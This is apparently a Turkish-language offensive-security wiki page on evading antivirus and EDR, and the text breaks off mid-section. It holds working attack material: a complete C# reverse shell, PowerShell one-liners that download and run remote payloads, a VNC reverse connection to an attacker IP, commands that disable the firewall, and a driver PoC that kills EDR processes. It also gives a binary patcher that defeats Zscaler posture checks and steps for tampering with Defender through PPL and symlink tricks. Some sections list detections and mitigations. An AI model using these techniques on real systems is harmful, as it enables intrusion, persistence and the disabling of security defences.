İnternetten bazı executable'ları indirip çalıştırırken bu ekranı görmüş olabilirsiniz.

Microsoft Defender SmartScreen, son kullanıcının potansiyel olarak zararlı uygulamaları çalıştırmasına karşı korumayı amaçlayan bir güvenlik mekanizmasıdır.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen ağırlıklı olarak bir reputation-based yaklaşımla çalışır; bu, nadiren indirilen uygulamaların SmartScreen'i tetikleyeceği ve son kullanıcıyı uyarması ve dosyayı çalıştırmasını engellemesi anlamına gelir (dosya yine de Daha fazla bilgi -> Yine de çalıştır seçilerek çalıştırılabilir).

**MoTW** (Mark of The Web), Zone.Identifier adında bir [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) olup, internetten dosya indirilirken otomatik olarak oluşturulur ve indirildiği URL'yi içerir.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>İnternetten indirilen bir dosyanın Zone.Identifier ADS'ini kontrol etme.</p></figcaption></figure>

> [!TIP]
> İmzalanmış ve **trusted** bir signing certificate ile imzalanmış executable'ların **SmartScreen'i tetiklemeyeceğini** not etmek önemlidir.

payload'larınızın Mark of The Web almamasını sağlamanın çok etkili bir yolu, bunları ISO gibi bir konteyner içine paketlemektir. Bunun nedeni Mark-of-the-Web (MOTW)'ün **non NTFS** hacimlerine **uygulanamamasıdır**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) payload'ları Mark-of-the-Web'den kaçmak için output container'lara paketleyen bir araçtır.

Örnek kullanım:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW), Windows'ta uygulamaların ve sistem bileşenlerinin olayları kaydetmesine olanak veren güçlü bir loglama mekanizmasıdır. Ancak, güvenlik ürünleri tarafından kötü amaçlı aktiviteleri izlemek ve tespit etmek için de kullanılabilir.

AMSI'nin devre dışı bırakıldığı (bypass edildiği) gibi, kullanıcı alanı sürecinin **`EtwEventWrite`** fonksiyonunun hiçbir olay kaydetmeden hemen dönmesini sağlamak da mümkündür. Bu, fonksiyonun bellekte anında dönecek şekilde patch'lenmesiyle yapılır; böylece o süreç için ETW loglaması fiilen devre dışı bırakılmış olur.

Daha fazla bilgi için şunlara bakabilirsiniz: **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

C# ikili dosyalarının belleğe yüklenmesi uzun zamandır bilinen bir yöntemdir ve AV tarafından yakalanmadan post-exploitation araçlarınızı çalıştırmak için hâlâ çok etkili bir yoldur.

Payload doğrudan belleğe yükleneceği için diske dokunulmaz; bu yüzden tüm süreç için yalnızca AMSI'yi patch'lemekle ilgilenmemiz gerekecek.

Çoğu C2 framework'ü (sliver, Covenant, metasploit, CobaltStrike, Havoc, vb.) zaten C# assembly'lerini doğrudan bellekte çalıştırma yeteneği sağlar, ancak bunu yapmanın farklı yolları vardır:

- **Fork\&Run**

Bu yöntem, **yeni bir kurban süreci spawn etmeyi**, post-exploitation kötü amaçlı kodunuzu o yeni sürece enjekte etmeyi, kötü amaçlı kodu çalıştırmayı ve iş bittikten sonra yeni süreci öldürmeyi içerir. Bunun hem avantajları hem de dezavantajları vardır. Fork and run yönteminin avantajı, yürütmenin Beacon implant sürecimizin **dışında** gerçekleşmesidir. Bu, post-exploitation eylemimizde bir şey ters gider veya yakalanırsa, implantımızın hayatta kalma olasılığının **çok daha yüksek** olduğu anlamına gelir. Dezavantajı ise **Behavioural Detections** tarafından yakalanma olasılığının **daha yüksek** olmasıdır.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Bu, post-exploitation kötü amaçlı kodunuzu **kendi sürecine** enjekte etmekle ilgilidir. Bu sayede yeni bir süreç oluşturup AV tarafından taranmasını önleyebilirsiniz, ancak dezavantajı payload'unuzun yürütülmesinde bir şeyler ters giderse beacon'ınızı **kaybetme** olasılığının **çok daha yüksek** olmasıdır çünkü süreç çökebilir.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> C# Assembly yükleme hakkında daha fazla okumak isterseniz, şu makaleye bakın: [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) ve InlineExecute-Assembly BOF'ına ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

C# Assemblies'i **PowerShell** üzerinden de yükleyebilirsiniz, bakınız [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) ve [S3cur3th1sSh1t'in videosu](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

As proposed in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), diğer dilleri kullanarak kötü amaçlı kod çalıştırmak mümkündür; bunun için ele geçirilmiş makinenin Attacker Controlled SMB share üzerinde kurulu yorumlayıcı ortamına erişimi olması gerekir.

SMB paylaşımındaki Interpreter Binaries ve ortamına erişim sağlanırsa, ele geçirilen makinenin belleği içinde bu dillerde rastgele kodlar **çalıştırabilirsiniz**.

Repo şu bilgiyi veriyor: Defender hâlâ script'leri tarıyor ancak Go, Java, PHP vb. kullanarak **static signature'ları atlatmada daha fazla esnekliğimiz** oluyor. Bu dillerdeki rastgele, obfuskasyonsuz reverse shell script'leriyle yapılan testler başarılı olduğunu gösterdi.

## TokenStomping

Token stomping, bir saldırganın **access token'ı veya EDR ya da AV gibi bir güvenlik ürünü üzerinde manipülasyon yapmasına** olanak tanıyan bir tekniktir; bu sayede süreç ölmez ancak kötü amaçlı aktiviteleri kontrol etme yetkisi azaltılmış olur.

Bunu önlemek için Windows, güvenlik süreçlerinin token'ları üzerinde external process'lerin handle almasını **engelleyebilir**.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

[**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) bölümünde açıklandığı gibi, bir hedef PC'ye Chrome Remote Desktop kurup ele geçirip kalıcılık sağlamak oldukça kolaydır:
1. https://remotedesktop.google.com/ adresinden indirin, "Set up via SSH"e tıklayın ve Windows için MSI dosyasını indirmek üzere MSI dosyasına tıklayın.
2. Kurulumu hedefte sessizce çalıştırın (yönetici gerekli): `msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop sayfasına geri dönün ve next'e tıklayın. Sihirbaz sizden yetki isteyecektir; devam etmek için Authorize butonuna tıklayın.
4. Verilen parametreyi bazı ayarlamalarla çalıştırın: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Not: pin parametresi GUI kullanmadan pin ayarlamaya izin verir.)

## Advanced Evasion

Evasion çok karmaşık bir konudur; bazen tek bir sistemde birçok farklı telemetri kaynağını dikkate almak gerekir, bu yüzden olgun ortamlarda tamamen tespit edilmeden kalmak neredeyse imkânsızdır.

Karşılaştığınız her ortamın kendi güçlü ve zayıf yönleri olacaktır.

Daha ileri seviye Evasion tekniklerine giriş yapmak için [@ATTL4S](https://twitter.com/DaniLJ94) tarafından verilen bu konuşmayı izlemenizi şiddetle tavsiye ederim.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Bu aynı zamanda Evasion in Depth hakkında [@mariuszbit](https://twitter.com/mariuszbit) tarafından verilmiş başka harika bir konuşmadır.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Defender'ın hangi kısımları zararlı bulduğunu kontrol etme**

[**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) aracını kullanabilirsiniz; bu araç ikili dosyanın parçalarını **kaldırarak** Defender'ın hangi kısmı zararlı bulduğunu tespit edene kadar ilerler ve sonucu size parçalar halinde sunar.\
Aynı işi yapan başka bir araç da [**avred**](https://github.com/dobin/avred) ve hizmeti açık web üzerinden [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) adresinde sunmaktadır.

### **Telnet Server**

Windows 10'a kadar tüm Windows sürümleri, yönetici olarak kurabileceğiniz bir **Telnet server** ile geliyordu; bunu kurmak için:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Sistem başlatıldığında onun **başlamasını** sağlayın ve şimdi onu **çalıştırın**:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**telnet portunu değiştir** (gizli) ve güvenlik duvarını devre dışı bırak:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (bin indirmelerini tercih edin, setup değil)

**ON THE HOST**: Execute _**winvnc.exe**_ and configure the server:

- Enable the option _Disable TrayIcon_
- Set a password in _VNC Password_
- Set a password in _View-Only Password_

Then, move the binary _**winvnc.exe**_ and **newly** created file _**UltraVNC.ini**_ inside the **victim**

#### **Reverse connection**

The **attacker** should **execute inside** his **host** the binary `vncviewer.exe -listen 5900` so it will be **prepared** to catch a reverse **VNC connection**. Then, inside the **victim**: Start the winvnc daemon `winvnc.exe -run` and run `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** Gizliliği korumak için bazı şeyleri yapmamalısınız

- Don't start `winvnc` if it's already running or you'll trigger a [popup](https://i.imgur.com/1SROTTl.png). check if it's running with `tasklist | findstr winvnc`
- Don't start `winvnc` without `UltraVNC.ini` in the same directory or it will cause [the config window](https://i.imgur.com/rfMQWcf.png) to open
- Don't run `winvnc -h` for help or you'll trigger a [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Download it from: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
GreatSCT'nin İçinde:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Şimdi **lister'ı başlatın** `msfconsole -r file.rc` ile ve **çalıştırın** **xml payload**'ı şu komutla:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Mevcut defender işlemi çok hızlı bir şekilde sonlandıracaktır.**

### Kendi reverse shell'imizi derlemek

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### İlk C# Revershell

Şu şekilde derleyin:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Bununla birlikte kullanın:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# ile derleyici kullanımı
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Otomatik indirme ve yürütme:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# obfuscators listesi: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### python ile build injectors örneği:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Diğer araçlar
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Daha Fazla

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Çekirdek Alanından AV/EDR'i Devre Dışı Bırakma

Storm-2603, fidye yazılımı bırakmadan önce uç nokta korumalarını devre dışı bırakmak için **Antivirus Terminator** adlı küçük bir konsol aracını kullandı. Araç, **kendi açık fakat *imzalı* sürücüsünü** beraberinde getirir ve Protected-Process-Light (PPL) AV servislerinin bile engelleyemediği ayrıcalıklı çekirdek işlemlerini gerçekleştirmek için bunu suistimal eder.

Ana çıkarımlar
1. İmzalı sürücü: Diske bırakılan dosya `ServiceMouse.sys` iken, ikili dosya Antiy Labs’in “System In-Depth Analysis Toolkit” paketinden yasal olarak imzalanmış sürücü `AToolsKrnl64.sys`'dir. Sürücü geçerli bir Microsoft imzası taşıdığından Driver-Signature-Enforcement (DSE) etkin olsa bile yüklenir.
2. Servis kurulumu:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
İlk satır sürücüyü bir **kernel servisi** olarak kaydeder, ikinci satır ise başlatarak `\\.\ServiceMouse`'ın kullanıcı alanından erişilebilir hale gelmesini sağlar.
3. Sürücünün sunduğu IOCTL'ler
| IOCTL code | İşlev                              |
|-----------:|------------------------------------|
| `0x99000050` | Belirtilen PID ile rastgele bir süreci sonlandırma (Defender/EDR servislerini sonlandırmak için kullanılmıştır) |
| `0x990000D0` | Diskteki herhangi bir dosyayı silme |
| `0x990001D0` | Sürücüyü yükten boşaltma ve servisi kaldırma |

Minimal C örnek (PoC):
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. Neden işe yarıyor: BYOVD kullanıcı modu korumalarını tamamen atlar; çekirdekte çalışan kod, *korumalı* süreçleri açabilir, sonlandırabilir veya PPL/PP, ELAM veya diğer sertleştirme özelliklerine bakılmaksızın çekirdek nesneleriyle oynayabilir.

Tespit / Hafifletme
•  Microsoft’un savunmasız-sürücü blok listesini etkinleştirin (`HVCI`, `Smart App Control`) böylece Windows `AToolsKrnl64.sys` yüklemeyi reddeder.  
•  Yeni *kernel* servislerinin oluşturulmasını izleyin ve bir sürücü herkese yazılabilir bir dizinden yüklendiğinde veya izinli listede olmadığında uyarı verin.  
•  Özel cihaz nesnelerine yönelik kullanıcı-modu tutacaklarının oluşturulmasını ve bunu takiben şüpheli `DeviceIoControl` çağrılarını izleyin.

### Disk Üzerindeki İkili Dosyaların Yama Yapılmasıyla Zscaler Client Connector Duruş Kontrollerinin Atlatılması

Zscaler’ın **Client Connector**'ı cihaz-duruş kurallarını yerel olarak uygular ve sonuçları diğer bileşenlere iletmek için Windows RPC'ye dayanır. Tam bir atlatmayı mümkün kılan iki zayıf tasarım tercihi vardır:

1. Duruş değerlendirmesi **tamamen istemci tarafında** gerçekleşir (sunucuya yalnızca bir boolean gönderilir).  
2. Dahili RPC uç noktaları yalnızca bağlanan yürütülebilir dosyanın **Zscaler tarafından imzalandığını** doğrular (WinVerifyTrust aracılığıyla).

Diskteki dört imzalı ikiliyi **yama yaparak** her iki mekanizma da etkisiz hale getirilebilir:

| Binary | Yamalanan orijinal mantık | Sonuç |
|--------|---------------------------|--------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Her zaman `1` döndürür, böylece tüm kontroller uyumlu olur |
| `ZSAService.exe` | WinVerifyTrust'e dolaylı çağrı | NOP-ed ⇒ herhangi bir (hatta imzasız) süreç RPC pipe'larına bağlanabilir |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret` ile değiştirildi |
| `ZSATunnel.exe` | Tuneldeki bütünlük kontrolleri | Kısa devrelendi |

Minimal patchleyici kesiti:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Orijinal dosyalar değiştirildikten ve servis yığını yeniden başlatıldıktan sonra:

* **All** posture checks display **green/compliant**.
* İmzasız veya değiştirilmiş ikili dosyalar isimlendirilmiş pipe RPC uç noktalarını açabilir (ör. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* İhlal edilmiş host, Zscaler politikalarıyla tanımlanan iç ağa sınırsız erişim kazanır.

Bu vaka çalışması, tamamen istemci taraflı güven kararlarının ve basit imza kontrollerinin birkaç byte yaması ile nasıl aşılabileceğini gösterir.

## Protected Process Light (PPL) kullanarak LOLBINs ile AV/EDR'e müdahale

Protected Process Light (PPL), yalnızca aynı veya daha yüksek düzeydeki korumalı süreçlerin birbirlerini değiştirebilmesini sağlamak için bir signer/level hiyerarşisi uygular. Saldırgan senaryosunda, eğer yasal olarak PPL-etkin bir ikiliyi başlatabiliyor ve argümanlarını kontrol edebiliyorsanız, zararsız bir işlevi (ör. logging) AV/EDR tarafından kullanılan korumalı dizinlere karşı sınırlı, PPL destekli bir yazma ilkeline dönüştürebilirsiniz.

What makes a process run as PPL
- The target EXE (and any loaded DLLs) must be signed with a PPL-capable EKU.
- The process must be created with CreateProcess using the flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- A compatible protection level must be requested that matches the signer of the binary (e.g., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` for anti-malware signers, `PROTECTION_LEVEL_WINDOWS` for Windows signers). Wrong levels will fail at creation.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (selects protection level and forwards arguments to the target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- İmzalı sistem ikili dosyası `C:\Windows\System32\ClipUp.exe` kendini başlatır ve çağıranın belirttiği bir yola log dosyası yazmak için bir parametre alır.
- PPL süreci olarak başlatıldığında, dosya yazma işlemi PPL desteğiyle gerçekleşir.
- ClipUp boşluk içeren yolları çözümleyemez; normalde korunan konumlara işaret etmek için 8.3 kısa yollarını kullanın.

8.3 short path helpers
- Kısa isimleri listele: `dir /x` her üst dizinde.
- cmd'de kısa yolu elde et: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) PPL yetenekli LOLBIN (ClipUp) `CREATE_PROTECTED_PROCESS` ile bir başlatıcı kullanarak (örn. CreateProcessAsPPL) çalıştırın.
2) ClipUp log-yolu argümanını korumalı bir AV dizininde dosya oluşturmayı zorlamak için iletin (örn. Defender Platform). Gerekirse 8.3 kısa isimleri kullanın.
3) Hedef ikili dosya AV tarafından çalışırken normalde açık/kilitliyse (örn. MsMpEng.exe), yazmayı AV başlamadan önce önyüklemede planlamak için daha erken çalışan bir otomatik başlatma servisi kurun. Önyükleme sırasını Process Monitor (boot logging) ile doğrulayın.
4) Yeniden başlatmada PPL destekli yazma AV ikililerini kilitlemeden önce gerçekleşir, hedef dosyayı bozar ve başlatmayı engeller.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notes and constraints
- ClipUp'un yazdığı içeriğin kontrolü sadece yerleştirme ile sınırlıdır; bu primitive hassas içerik enjeksiyonundan ziyade bozma için uygundur.
- Bir servisi kurmak/başlatmak ve bir yeniden başlatma penceresi için Local Administrator/SYSTEM gerekir.
- Zamanlama kritiktir: hedef açık olmamalıdır; önyükleme zamanı yürütme dosya kilitlerini önler.

Detections
- Alışılmadık argümanlarla `ClipUp.exe` süreç oluşturulması, özellikle standart dışı başlatıcılar tarafından üst süreç olarak parent edildiğinde, önyükleme civarında.
- Şüpheli ikili dosyaların otomatik başlatılacak şekilde yapılandırıldığı yeni servisler ve sürekli olarak Defender/AV'den önce başlatılıyor olması. Defender başlatma hatalarından önce servis oluşturma/değişikliklerini araştırın.
- Defender ikili dosyaları/Platform dizinlerinde dosya bütünlüğü izleme; protected-process flag'lerine sahip süreçler tarafından beklenmeyen dosya oluşturma/değişiklikleri.
- ETW/EDR telemetrisi: `CREATE_PROTECTED_PROCESS` ile oluşturulan süreçleri ve AV olmayan ikili dosyalar tarafından anormal PPL seviye kullanımlarını arayın.

Mitigations
- WDAC/Code Integrity: hangi imzalı ikililerin PPL olarak çalışabileceğini ve hangi üst süreçler altında çalışabileceklerini kısıtlayın; meşru bağlamlar dışındaki ClipUp çağrılarını engelleyin.
- Service hygiene: otomatik başlatmalı servislerin oluşturulmasını/değiştirilmesini kısıtlayın ve başlatma sırası manipülasyonunu izleyin.
- Defender tamper protection ve early-launch korumalarının etkin olduğunu doğrulayın; ikili dosya bozulmasını gösteren başlangıç hatalarını araştırın.
- Güvenlik araçlarını barındıran hacimlerde ortamınızla uyumluysa 8.3 kısa ad üretimini devre dışı bırakmayı değerlendirin (kapsamlı test yapın).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender çalıştığı platformu şu alt klasörleri listeleyerek seçer:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

En yüksek leksikografik sürüm dizesine sahip alt klasörü seçer (ör. `4.18.25070.5-0`) ve Defender servis süreçlerini oradan başlatır (servis/registry yollarını buna göre günceller). Bu seçim, dizin girdilerine ve dizin reparse noktalarına (symlinks) güvenir. Bir yönetici bunu kullanarak Defender'ı saldırganın yazabildiği bir yola yönlendirebilir ve DLL sideloading veya servis kesintisi gerçekleştirebilir.

Preconditions
- Local Administrator (Platform klasörü altında dizin/symlink oluşturmak için gerekli)
- Yeniden başlatma yeteneği veya Defender platformu yeniden seçimini tetikleme (servis yeniden başlatması önyüklemede)
- Sadece yerleşik araçlar gerekli (mklink)

Why it works
- Defender kendi klasörlerine yazmayı engeller, ancak platform seçimi dizin girdilerine güvenir ve hedefin korumalı/güvenilir bir yola çözüldüğünü doğrulamadan en yüksek leksikografik sürümü seçer.

Step-by-step (example)
1) Prepare a writable clone of the current platform folder, e.g. `C:\TMP\AV`:
```cmd
